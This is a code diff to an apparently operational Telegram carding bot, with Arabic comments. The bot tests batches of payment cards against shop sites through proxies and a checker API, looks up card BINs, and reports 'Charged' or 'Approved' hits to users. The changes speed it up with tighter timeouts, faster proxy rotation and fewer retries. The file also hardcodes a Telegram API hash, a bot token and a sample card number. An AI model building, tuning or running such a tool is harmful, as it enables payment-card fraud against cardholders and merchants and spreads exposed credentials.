@@ -19,9 +19,9 @@ API_ID = 30067059
 API_HASH = 'c9ee8df29903caf150937299f97703e2'
 BOT_TOKEN = '8145446640:AAEiIDCzyoDlaf2NICb_TRz-x1SG8jffMc8'
 
-# تم تقليل التأخير وعدد العمال لتجنب خنق الخادم والبروكسيات
+# 30 عامل يعتبر رقماً متوازناً جداً للسرعة دون خنق الخادم
 WORKERS = 30
-DELAY = 0.02  
+DELAY = 0.01  
 
 PREMIUM_FILE = 'premium.txt'
 SITES_FILE = 'sites.txt'
@@ -109,14 +109,14 @@ _DEAD_INDICATORS = (
 )
 
 # =========================================================================
-# الجلسة الموحدة (Global Session) مع تحديد الاتصالات لتجنب التعليق
+# الجلسة الموحدة السريعة 
 # =========================================================================
 _global_session = None
 
 async def get_session():
     global _global_session
     if _global_session is None or _global_session.closed:
-        connector = aiohttp.TCPConnector(limit=100, ssl=False)
+        connector = aiohttp.TCPConnector(limit=100, ssl=False, force_close=True) 
         _global_session = aiohttp.ClientSession(connector=connector)
     return _global_session
 # =========================================================================
@@ -150,7 +150,8 @@ def is_dead_site_error(error_msg):
 async def get_bin_info(card_number):
     try:
         bin_number = card_number[:6]
-        timeout = aiohttp.ClientTimeout(total=10)
+        # مهلة قصيرة جداً لجلب الـ BIN حتى لا يعطل الإرسال
+        timeout = aiohttp.ClientTimeout(total=5, connect=2)
         session = await get_session()
         async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=timeout) as res:
             if res.status != 200:
@@ -179,11 +180,15 @@ async def check_card(card, site, proxy):
             return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card, 'proxy': proxy}
 
         params = {'cc': card, 'url': site, 'proxy': proxy}
-        timeout = aiohttp.ClientTimeout(total=20, connect=5)
+        
+        # --- التعديل الأهم للسرعة: مهلة صارمة جداً للبروكسي ---
+        # إذا لم يقم بإنشاء اتصال خلال 3 ثوانٍ، أو لم يرد خلال 10، اقطع الاتصال فوراً.
+        timeout = aiohttp.ClientTimeout(total=10, connect=3)
         
         session = await get_session() 
         async with session.get(CHECKER_API_URL, params=params, timeout=timeout) as resp:
-            if resp.status in [502, 503, 504]:
+            # إذا كان الـ API مزدحماً، لا تضيع الوقت
+            if resp.status in [502, 503, 504, 429]:
                  return {'status': 'Site Error', 'message': f'API Congested ({resp.status})', 'card': card, 'retry': True, 'proxy': proxy}
             raw = await resp.json(content_type=None)
 
@@ -216,13 +221,14 @@ async def check_card(card, site, proxy):
             return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price, 'proxy': proxy}
 
     except asyncio.TimeoutError:
-        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True, 'proxy': proxy}
+        return {'status': 'Site Error', 'message': 'API Timeout (Proxy Slow)', 'card': card, 'retry': True, 'proxy': proxy}
     except aiohttp.ClientError:
-        return {'status': 'Site Error', 'message': 'API Connection Dropped', 'card': card, 'retry': True, 'proxy': proxy}
+        return {'status': 'Site Error', 'message': 'Connection Dropped', 'card': card, 'retry': True, 'proxy': proxy}
     except Exception:
         return {'status': 'Site Error', 'message': 'API Error', 'card': card, 'retry': True, 'proxy': proxy}
 
-async def check_card_with_retry(card, sites, proxies, max_retries=15):
+# --- تقليل عدد المحاولات إلى 5 بدلاً من 15 للسرعة ---
+async def check_card_with_retry(card, sites, proxies, max_retries=5):
     last_result = None
     if not sites: return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'proxy': 'Unknown'}
     if not proxies: return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'proxy': 'Unknown'}
@@ -230,7 +236,9 @@ async def check_card_with_retry(card, sites, proxies, max_retries=15):
     available_proxies = list(proxies)
 
     for attempt in range(max_retries):
-        if not available_proxies: available_proxies = list(proxies)
+        if not available_proxies: 
+            return {'status': 'Dead', 'message': 'All proxies failed', 'card': card, 'gateway': 'Unknown', 'price': '-', 'proxy': 'None'}
+            
         site = random.choice(sites)
         proxy = random.choice(available_proxies)
         
@@ -240,18 +248,20 @@ async def check_card_with_retry(card, sites, proxies, max_retries=15):
         last_result = result
         msg_lower = str(result.get('message', '')).lower()
 
-        if any(x in msg_lower for x in ['proxy dead', 'proxy error', 'timeout', 'bad proxy', 'connection timeout']):
+        # إذا كان الخطأ بسبب بطء البروكسي أو انقطاعه، أزله من القائمة النشطة لهذه البطاقة فوراً
+        if any(x in msg_lower for x in ['proxy', 'timeout', 'connection', 'dropped', 'error']):
             if proxy in available_proxies: available_proxies.remove(proxy)
 
+        # إذا كان الخادم الخلفي (API) نفسه يعطي خطأ 502/504، انتظر قليلاً ثم أعد المحاولة.
         if attempt < max_retries - 1:
-            if any(x in msg_lower for x in ['502', '503', '504', 'congested', 'limit', 'too many', 'api connection dropped', 'api timeout', 'api error']):
-                backoff_time = min((1.5 ** attempt) + random.uniform(0.5, 1.5), 10.0)
-                await asyncio.sleep(backoff_time)
+            if 'congested' in msg_lower or 'timeout' in msg_lower:
+                # انتظار قصير للتعافي
+                await asyncio.sleep(random.uniform(1.0, 2.5))
             else:
                 await asyncio.sleep(DELAY) 
 
     if last_result:
-        return {'status': 'Dead', 'message': f'API Congested/Proxy Failed: {str(last_result["message"])[:30]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple', 'proxy': last_result.get('proxy', 'Unknown')}
+        return {'status': 'Dead', 'message': f'API Failed: {str(last_result["message"])[:30]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple', 'proxy': last_result.get('proxy', 'Unknown')}
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-', 'proxy': 'Unknown'}
 
 async def send_realtime_hit(user_id, result, hit_type):
@@ -295,7 +305,7 @@ Proxy  ›  <code>{proxy}</code> {E_PROXY}"""
 
     gif_file_obj = None
     try:
-        timeout = aiohttp.ClientTimeout(total=10)
+        timeout = aiohttp.ClientTimeout(total=5)
         session = await get_session() 
         async with session.get(random_gif_url, timeout=timeout) as resp:
             if resp.status == 200:
@@ -399,7 +409,7 @@ async def send_final_results(user_id, results):
 async def test_site(site, proxy):
     try:
         params = {'cc': "5154623245618097|03|2032|156", 'url': site, 'proxy': proxy}
-        timeout = aiohttp.ClientTimeout(total=30)
+        timeout = aiohttp.ClientTimeout(total=10)
         session = await get_session()
         async with session.get(CHECKER_API_URL, params=params, timeout=timeout) as resp:
             raw = await resp.json(content_type=None)
@@ -416,7 +426,7 @@ async def test_proxy(proxy):
         elif len(parts) == 2: proxy_url = f"http://{parts[0]}:{parts[1]}"
         else: proxy_url = f"http://{proxy_url}"
     try:
-        timeout = aiohttp.ClientTimeout(total=15)
+        timeout = aiohttp.ClientTimeout(total=5)
         session = await get_session() 
         async with session.get('http://httpbin.org/ip', proxy=proxy_url, timeout=timeout) as resp:
             if resp.status == 200: return {'proxy': proxy, 'status': 'alive'}
@@ -477,7 +487,7 @@ async def single_cc_check(event):
     status_msg = await event.reply(f"<b>{E_SPARKLE} ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  {E_SPARKLE}</b>\n━━━━━━━━━━━━━━━━━\n<b>{E_SEARCH} 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠... {E_SEARCH}</b>\n\n{E_CARD} Card: <code>{card}</code>\n\n━━━━━━━━━━━━━━━━━", parse_mode='html')
 
     try:
-        result = await check_card_with_retry(card, sites, proxies, max_retries=15)
+        result = await check_card_with_retry(card, sites, proxies, max_retries=5)
         hit_type = 'Declined'
         if result['status'] in ['Charged', 'Approved']: hit_type = result['status']
             
@@ -548,7 +558,8 @@ async def check_command(event):
             except asyncio.QueueEmpty: break
             
             try:
-                res = await check_card_with_retry(card, loaded_sites, loaded_proxies, max_retries=15)
+                # الفحص الان يتم بمحاولات اقل لضمان عدم التعليق
+                res = await check_card_with_retry(card, loaded_sites, loaded_proxies, max_retries=5)
                 all_results['checked'] += 1
                 
                 if res['status'] == 'Charged':
